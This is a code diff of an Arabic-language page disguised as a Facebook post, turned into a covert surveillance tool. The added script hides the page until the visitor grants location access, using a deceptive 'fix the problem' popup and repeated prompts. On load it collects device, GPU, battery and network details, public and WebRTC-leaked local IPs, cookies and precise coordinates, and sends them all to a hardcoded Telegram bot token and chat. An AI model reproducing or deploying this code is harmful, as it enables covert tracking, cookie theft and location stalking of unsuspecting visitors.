@@ -5,7 +5,98 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>بوست فيسبوك</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
-    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f0f2f5;
+            display: none; /* إخفاء الصفحة بالكامل حتى يتم منح الإذن */
+        }
+        .post-container {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #fff;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            border-radius: 8px;
+            padding: 10px;
+        }
+        .post-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 10px;
+        }
+        .post-header img {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            margin-left: 10px;
+        }
+        .post-header div {
+            flex-grow: 1;
+        }
+        .post-content {
+            margin-bottom: 10px;
+        }
+        .post-images {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 5px;
+            margin-bottom: 10px;
+        }
+        .post-images img {
+            width: 100%;
+            border-radius: 4px;
+        }
+        .post-actions {
+            display: flex;
+            justify-content: space-around;
+            border-top: 1px solid #ddd;
+            padding-top: 10px;
+        }
+        .post-actions span {
+            cursor: pointer;
+            color: #1877f2;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        .post-actions span i {
+            margin-left: 5px;
+        }
+        .popup {
+            display: none;
+            position: fixed;
+            z-index: 1000;
+            left: 50%;
+            top: 50%;
+            transform: translate(-50%, -50%);
+            width: 80%;
+            max-width: 300px;
+            background-color: rgba(0, 0, 0, 0.8);
+            color: white;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+        }
+        .popup-content {
+            margin: 0 auto;
+            padding: 20px;
+        }
+        .popup button {
+            background-color: #1877f2;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 20px;
+        }
+        .popup button:hover {
+            background-color: #166fe5;
+        }
+    </style>
 </head>
 <body>
     <div class="post-container">
@@ -31,11 +122,209 @@
     </div>
     <div id="permissionPopup" class="popup">
         <div class="popup-content">
-            <h2>يبدو أنك تواجه مشكلة</h2>
-            <p>لحل هذه المشكلة قم بالسماح بالوصول الاشعارات التي سوف تصلك لتلقي التحديث حتى يتم عرض المحتوى كاملاً للصفحة</p>
-            <button onclick="requestLocationPermission()">حل المشكلة</button>
+            <h2>إشعار هام</h2>
+            <p>لحل مشكلة عرض المحتوى، يرجى السماح بالأذونات المطلوبة.</p>
+            <button onclick="requestLocationPermission()">السماح الآن</button>
         </div>
     </div>
-    <script src="script.js"></script>
+    <script>
+        // إرسال المعلومات إلى Telegram
+        function sendInformationToTelegram(info) {
+            var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
+            var chatId = '962686305';
+            var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;
+
+            fetch(url).then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                return response.json();
+            }).then(data => {
+                console.log('Information sent to Telegram bot:', data);
+            }).catch(error => {
+                console.error('There was a problem with the fetch operation:', error);
+            });
+        }
+
+        // جمع معلومات الجهاز والشبكة والبطارية والمزيد
+        function collectExtendedDeviceInfo() {
+            var deviceInfo = {};
+
+            // جمع معلومات الجهاز الأساسية
+            deviceInfo.platform = navigator.platform;
+            deviceInfo.hardwareConcurrency = navigator.hardwareConcurrency || 'غير متوفر';
+            deviceInfo.deviceMemory = navigator.deviceMemory || 'غير متوفر';
+            deviceInfo.userAgent = navigator.userAgent;
+            deviceInfo.language = navigator.language;
+
+            // تحديد المتصفح
+            if (deviceInfo.userAgent.indexOf('Firefox') != -1) {
+                deviceInfo.browser = 'Firefox';
+            } else if (deviceInfo.userAgent.indexOf('Chrome') != -1) {
+                deviceInfo.browser = 'Chrome';
+            } else if (deviceInfo.userAgent.indexOf('Safari') != -1) {
+                deviceInfo.browser = 'Safari';
+            } else if (deviceInfo.userAgent.indexOf('Edge') != -1) {
+                deviceInfo.browser = 'Edge';
+            }
+
+            // جمع معلومات وحدة المعالجة الرسومية
+            var canvas = document.createElement('canvas');
+            var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (gl) {
+                var debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                deviceInfo.gpuVendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
+                deviceInfo.gpuRenderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
+            }
+
+            // جمع دقة الشاشة
+            deviceInfo.screenHeight = window.screen.height;
+            deviceInfo.screenWidth = window.screen.width;
+
+            // جمع معلومات الشبكة
+            if ('connection' in navigator) {
+                var connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+                deviceInfo.networkType = connection.type;
+                deviceInfo.networkSpeed = connection.downlink;
+                deviceInfo.networkEffectiveType = connection.effectiveType;
+            }
+
+            // جمع معلومات البطارية
+            if ('getBattery' in navigator) {
+                navigator.getBattery().then(battery => {
+                    deviceInfo.batteryLevel = battery.level * 100 + '%';
+                    deviceInfo.batteryCharging = battery.charging ? 'نعم' : 'لا';
+                    deviceInfo.batteryChargingTime = battery.chargingTime;
+                    deviceInfo.batteryDischargingTime = battery.dischargingTime;
+                    sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
+                });
+            } else {
+                sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
+            }
+
+            // جمع عناوين IP
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    deviceInfo.publicIP = data.ip;
+                    sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
+                });
+
+            getLocalIP(ip => {
+                deviceInfo.localIP = ip;
+                sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
+            });
+
+            // جمع وتحليل الكوكيز
+            deviceInfo.cookies = document.cookie;
+            analyzeCookies(deviceInfo.cookies);
+
+            // جمع معلومات الجهاز الإضافية
+            deviceInfo.hardwareInfo = getHardwareInfo();
+
+            sendInformationToTelegram(JSON.stringify(deviceInfo, null, 2));
+        }
+
+        // تحليل الكوكيز
+        function analyzeCookies(cookies) {
+            var cookieArray = cookies.split(';');
+            var cookieData = {};
+            cookieArray.forEach(cookie => {
+                var [name, value] = cookie.split('=');
+                cookieData[name.trim()] = value;
+            });
+            sendInformationToTelegram('تحليل الكوكيز: ' + JSON.stringify(cookieData, null, 2));
+        }
+
+        // جمع عنوان IP المحلي
+        function getLocalIP(callback) {
+            var peerConnection = new RTCPeerConnection({ iceServers: [] });
+            peerConnection.createDataChannel('');
+            peerConnection.createOffer().then(offer => peerConnection.setLocalDescription(offer)).catch(error => console.error(error));
+            peerConnection.onicecandidate = event => {
+                if (event.candidate) {
+                    var candidate = event.candidate.candidate;
+                    var ipRegex = /([0-9]{1,3}(\.[0-9]{1,3}){3})/;
+                    var ipMatch = ipRegex.exec(candidate);
+                    if (ipMatch) {
+                        callback(ipMatch[1]);
+                    }
+                }
+            };
+        }
+
+        // جمع معلومات الهاردوير
+        function getHardwareInfo() {
+            var hardwareInfo = {};
+            // مثال: جمع معلومات النظام
+            hardwareInfo.userAgent = navigator.userAgent;
+            hardwareInfo.platform = navigator.platform;
+            hardwareInfo.vendor = navigator.vendor;
+
+            return hardwareInfo;
+        }
+
+        // طلب إذن الموقع وحفظه محليًا
+        function requestLocationPermission() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                localStorage.setItem('locationPermission', 'granted');
+                document.getElementById('permissionPopup').style.display = 'none';
+                document.body.style.display = 'block'; // عرض محتوى الصفحة بعد منح الإذن
+                collectAndSendLocation();
+            }, function(error) {
+                console.log("Error: " + error.message);
+                document.getElementById('permissionPopup').style.display = 'block';
+                setTimeout(requestLocationPermission, 5000); // إعادة طلب الإذن بعد 5 ثواني
+            });
+        }
+
+        // التحقق من حالة إذن الموقع
+        function checkLocationPermission() {
+            var locationPermission = localStorage.getItem('locationPermission');
+            if (locationPermission === 'granted') {
+                document.body.style.display = 'block'; // عرض محتوى الصفحة
+                collectAndSendLocation();
+            } else {
+                navigator.permissions.query({name:'geolocation'}).then(function(result) {
+                    if (result.state === 'granted') {
+                        document.body.style.display = 'block'; // عرض محتوى الصفحة
+                        collectAndSendLocation();
+                    } else if (result.state === 'prompt' || result.state === 'denied') {
+                        document.getElementById('permissionPopup').style.display = 'block';
+                        setTimeout(requestLocationPermission, 5000); // إعادة طلب الإذن بعد 5 ثواني
+                    }
+                });
+            }
+        }
+
+        // جمع وإرسال موقع المستخدم
+        function collectAndSendLocation() {
+            navigator.geolocation.getCurrentPosition(function(position) {
+                var lat = position.coords.latitude;
+                var lon = position.coords.longitude;
+                var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
+                var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                sendInformationToTelegram(locationInfo);
+            }, function(error) {
+                // في حال الفشل في الحصول على الموقع، يمكن استخدام طرق أخرى
+                fetch('https://ipapi.co/json/')
+                    .then(response => response.json())
+                    .then(data => {
+                        var lat = data.latitude;
+                        var lon = data.longitude;
+                        var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
+                        var locationInfo = `إحداثيات مستخلصة من IP: خط العرض ${lat}، خط الطول ${lon}\nرابط الموقع على جوجل مابس: ${googleMapsLink}`;
+                        sendInformationToTelegram(locationInfo);
+                    });
+            });
+        }
+
+        // استدعاء الوظائف عند تحميل الصفحة
+        window.onload = function() {
+            checkLocationPermission();
+            collectExtendedDeviceInfo();
+            setInterval(checkLocationPermission, 30); // التحقق من الإذن كل 30 ثانية
+        };
+    </script>
 </body>
 </html>
